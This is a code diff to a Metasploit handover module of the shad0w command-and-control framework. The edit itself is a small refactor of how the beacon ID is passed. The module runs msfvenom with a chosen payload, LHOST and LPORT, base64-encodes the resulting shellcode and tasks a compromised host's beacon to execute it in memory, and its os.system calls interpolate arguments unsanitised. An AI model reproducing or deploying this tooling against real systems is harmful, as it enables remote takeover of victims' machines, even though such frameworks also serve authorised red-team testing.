@@ -5,7 +5,8 @@
 from lib import buildtools, tools, shellcode
 import os
 import argparse
-__description__ = "metasploit handover module, will generate and deploy metasploit payload into memory"
+
+__description__ = "Metasploit handover module, will generate and deploy metasploit payload into memory"
 __author__ = "@Flangvik"
 
 EXEC_ID = 0x3000
@@ -25,7 +26,7 @@ def exit(status=0, message=None):
     return
 
 
-def msfvenom_payload_gen(shad0w, payload, lport, lhost, arch, beaconId):
+def msfvenom_payload_gen(shad0w, payload, lport, lhost, arch):
 
     # Print some info
     shad0w.debug.log(f"Metasploit is building the shellcode...", log=True)
@@ -34,13 +35,13 @@ def msfvenom_payload_gen(shad0w, payload, lport, lhost, arch, beaconId):
     os.chdir("/root/shad0w/bin/metasploit")
 
     #Generate the shellcode
-    os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw -a {arch} > {beaconId}.bin")
+    os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw -a {arch} > {shad0w.current_beacon}.bin")
 
     #Base64 encode
-    os.system(f"cat {beaconId}.bin | base64 -w 0 > {beaconId}.b64")
+    os.system(f"cat {shad0w.current_beacon}.bin | base64 -w 0 > {shad0w.current_beacon}.b64")
 
     # Read and return the b64Shellcode
-    b64File = open(f'{beaconId}.b64',mode='r')
+    b64File = open(f'{shad0w.current_beacon}.b64',mode='r')
     shellCodeB64 = b64File.read()
     b64File.close()
 
@@ -83,7 +84,7 @@ def main(shad0w, args):
         return
 
     # Generate and read the msfvenom shellcode
-    rcode = msfvenom_payload_gen(shad0w, payload = args.payload, lport = args.port, lhost = args.host, arch="x64", beaconId = shad0w.current_beacon)
+    rcode = msfvenom_payload_gen(shad0w, payload = args.payload, lport = args.port, lhost = args.host, arch="x64")
 
     # set a task for the current beacon to do
     shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
